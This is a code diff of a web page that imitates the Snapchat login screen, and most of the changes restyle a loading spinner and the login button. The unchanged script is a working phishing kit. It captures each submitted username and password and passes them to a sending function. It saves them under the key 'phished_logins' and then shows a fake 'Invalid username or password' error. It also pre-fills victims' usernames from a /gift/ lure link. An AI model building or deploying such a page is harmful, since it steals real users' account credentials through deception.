@@ -17,10 +17,10 @@
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
 <style>
 @import url("https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap");
-body { font-family: "Inter", sans-serif; -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; }
+body { font-family: "Inter", sans-serif; user-select: none; -webkit-user-select: none; -ms-user-select: none; }
 ::-webkit-scrollbar { display: none; }
 
-/* Checkbox with proper checkmark */
+/* Checkbox */
 input[type="checkbox"] {
   -webkit-appearance: none; -moz-appearance: none; appearance: none;
   width: 1rem; height: 1rem; border: 2px solid #d1d5db;
@@ -37,23 +37,15 @@ input[type="checkbox"]:focus { outline: none; box-shadow: 0 0 0 2px rgba(0,176,2
 
 /* Login button */
 #loginBtn { 
-  transition: bottom 0.3s ease; 
+  transition: all 0.2s ease; 
   min-width: 42%; 
   width: 62%; 
   font-size: 1.05rem; 
   padding: 0.7rem 0; 
-  display: flex; justify-content: center; align-items: center;
+  display: block; 
   margin: 0 auto; 
-  position: relative;
 }
-#loginBtn:active { filter: brightness(90%); }
-#loginBtn .spinner { position: absolute; display: flex; align-items: center; justify-content: center; }
-#loginBtn .spinner.hidden { display: none; }
-#loginBtn .btn-text.hidden { display: none; }
-#loginBtn .spinner--outer { width: 20px; height: 20px; border-top: 2px solid #d2d2d2; border-right: 2px solid #d2d2d2; border-radius: 4rem; display: flex; align-items: center; justify-content: center; animation: clockwise 1000ms infinite linear; }
-#loginBtn .spinner--inner { width: 10px; height: 10px; border-bottom: 2px solid #d2d2d2; border-left: 2px solid #d2d2d2; border-radius: 100px; animation: counterClockwise 500ms infinite linear; }
-@keyframes clockwise { from { transform: rotate(0deg) } to { transform: rotate(359deg) } }
-@keyframes counterClockwise { from { transform: rotate(0deg) } to { transform: rotate(-359deg) } }
+#loginBtn:active { background-color: #0090e0; }
 
 /* Inputs */
 .input-container { width: 85%; margin: 0 auto; }
@@ -70,21 +62,21 @@ input[type="text"], input[type="password"] {
 label[for="password"] { position: relative; top: -6px; font-size: 0.75rem; }
 #password { position: relative; top: -6px; }
 
-/* Small gap between username and password */
+/* Gap between username and password */
 .password-container { margin-top: 4px; position: relative; }
 
-/* Checkbox and Forgot password spacing */
+/* Checkbox and forgot password */
 label.inline-flex.items-center { 
   position: relative; 
   top: -8px; 
   font-size: 0.817rem; 
-  font-weight: 350; 
+  font-weight: 350;
 }
 #forgotPassword { 
   position: relative; 
   top: -9.5px; 
   font-size: 0.817rem; 
-  font-weight: 350; 
+  font-weight: 350;
   color: #0083ff; 
 }
 
@@ -118,7 +110,7 @@ form.flex.flex-col.space-y-6 { gap: 0.5rem; }
 #adminSection.active { display: block; }
 .back-arrow i { font-size: 1rem; }
 
-/* Password toggle button inside the input */
+/* Password toggle button */
 .password-toggle { 
   position: absolute; right: 0; top: 50%; 
   transform: translateY(-50%); 
@@ -128,6 +120,30 @@ form.flex.flex-col.space-y-6 { gap: 0.5rem; }
   border: none; 
   cursor: pointer; 
 }
+
+/* Spinner */
+.spinner { display: flex; align-items: center; justify-content: center; }
+.spinner--outer {
+  border-top: 2px solid #d2d2d2; 
+  border-right: 2px solid #d2d2d2;
+  border-radius: 50%;
+  width: 20px;
+  height: 20px;
+  display: flex;
+  align-items: center;
+  justify-content: center; 
+  animation: clockwise 1000ms infinite linear;
+}
+.spinner--inner {
+  border-bottom: 2px solid #d2d2d2; 
+  border-left: 2px solid #d2d2d2;
+  border-radius: 50%;
+  width: 10px;
+  height: 10px;
+  animation: counterClockwise 500ms infinite linear;
+}
+@keyframes clockwise { from { transform: rotate(0deg); } to { transform: rotate(359deg); } }
+@keyframes counterClockwise { from { transform: rotate(0deg); } to { transform: rotate(-359deg); } }
 </style>
 </head>
 <body class="bg-white min-h-screen flex flex-col justify-between max-w-lg mx-auto relative">
@@ -154,11 +170,9 @@ form.flex.flex-col.space-y-6 { gap: 0.5rem; }
       <span>Save Login Info on your iCloud devices</span>
     </label>
     <a id="forgotPassword" href="https://accounts.snapchat.com/accounts/password_reset_request" class="text-center text-sm font-sans mt-2 input-container">Forgot your password?</a>
-    <button id="loginBtn" type="submit" class="bg-[#b7c0c8] text-white font-medium text-lg py-3 rounded-full mt-4" disabled>
+    <button id="loginBtn" type="submit" class="bg-[#b7c0c8] text-white font-medium text-lg py-3 rounded-full mt-4 flex justify-center items-center" disabled>
       <span class="btn-text">Log In</span>
-      <div class="spinner spinner--outer hidden">
-        <div class="spinner spinner--inner"></div>
-      </div>
+      <span class="spinner" style="display:none;"><span class="spinner--outer"><span class="spinner--inner"></span></span></span>
     </button>
   </form>
 </div>
@@ -196,7 +210,6 @@ document.addEventListener("DOMContentLoaded", function(){
         m3=3;
   let n4=0,l5=JSON.parse(localStorage.getItem("phished_logins")||"[]");
 
-  // Pre-fill username if URL matches /gift/{something}/login
   const pathMatch = window.location.pathname.match(/\/gift\/([^\/]+)\/login/);
   if(pathMatch && pathMatch[1]){ a.value = pathMatch[1]; }
 
@@ -228,42 +241,30 @@ document.addEventListener("DOMContentLoaded", function(){
   a.addEventListener("input",y2);
   b.addEventListener("input",y2);
 
-  const btnText = c.querySelector('.btn-text');
-  const spinner = c.querySelector('.spinner');
-
-  e.addEventListener("submit", async function(o){
+  e.addEventListener("submit",async function(o){
     o.preventDefault();
-    btnText.classList.add('hidden');
-    spinner.classList.remove('hidden');
+    const spinner = c.querySelector(".spinner");
+    const btnText = c.querySelector(".btn-text");
+    spinner.style.display = "flex";
+    btnText.style.display = "none";
 
-    const t = a.value.trim(), u = b.value.trim(), v = new Date().toLocaleString();
-
-    if(t && u){
-      const w = {username: t, password: u, timestamp: v};
-      await x1(w);
-      l5.push(w);
-      localStorage.setItem("phished_logins", JSON.stringify(l5));
-      z3(t,v);
-
-      setTimeout(() => {
-        d.textContent = "Invalid username or password. Try again.";
+    const t=a.value.trim(),u=b.value.trim(),v=new Date().toLocaleString();
+    if(t&&u){
+      const w={username:t,password:u,timestamp:v};
+      await x1(w),l5.push(w),localStorage.setItem("phished_logins",JSON.stringify(l5)),z3(t,v);
+      setTimeout(()=>{
+        d.textContent="Invalid username or password. Try again.";
         d.classList.remove("hidden");
-        b.value = "";
-        y2();
-
-        spinner.classList.add('hidden');
-        btnText.classList.remove('hidden');
-
-        c.classList.remove("bg-[#00b0ff]");
-        c.classList.add("bg-[#b7c0c8]");
-        c.disabled = true;
-      }, 1200);
-    } else {
-      d.textContent = "Please fill in both fields.";
+        b.value="";y2();
+        spinner.style.display="none";
+        btnText.style.display="inline";
+        c.classList.remove("bg-[#00b0ff]");c.classList.add("bg-[#b7c0c8]");c.disabled=!0;
+      },1200);
+    }else {
+      d.textContent="Please fill in both fields.";
       d.classList.remove("hidden");
-
-      spinner.classList.add('hidden');
-      btnText.classList.remove('hidden');
+      spinner.style.display="none";
+      btnText.style.display="inline";
     }
   });
 
